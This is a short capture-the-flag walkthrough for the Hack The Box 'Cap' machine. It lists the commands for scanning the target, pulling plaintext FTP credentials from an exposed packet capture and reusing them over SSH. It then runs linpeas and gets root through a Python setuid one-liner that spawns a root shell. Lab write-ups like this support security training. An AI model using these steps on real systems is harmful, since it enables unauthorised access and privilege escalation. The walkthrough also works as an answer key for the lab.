# Solution to CAP Box - Hack The Box

## Connecting to the Machine
1. **Connect with OpenVPN** to the target machine.
2. **Ping the machine** to check connectivity:
   ```bash
   ping <target-ip>
   ```
3. **Scan the machine with Nmap**:
   ```bash
   nmap <target-ip>
   ```

## Finding Vulnerabilities
- **Discovered a website vulnerability** that allows access to `.pcap` files.
- **Analyzed `0.pcap`** and found FTP (File Transfer Protocol) credentials in plaintext:

  **Credentials found:**
  ```
  User: Nathan
  Pass: Buck3tH4TF0RM3!
  ```

## Gaining Access via SSH
1. **Use the credentials to connect via SSH**:
   ```bash
   ssh nathan@<target-ip>
   ```
2. **Transfer `linpeas.sh` to the machine using SCP**:
   ```bash
   scp linpeas.sh nathan@<target-ip>:/home/nathan/
   ```
3. **Run `linpeas.sh`** to check for privilege escalation vectors:
   ```bash
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

## Privilege Escalation
- **Found `/usr/bin/python3.8` marked as high-risk for privilege escalation.**
- **Exploit it using the following command:**
  ```bash
  /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
- **Now running as root!**
- **Navigate to `/root` to retrieve the flag**:
  ```bash
  cat /root/root.txt
  ```

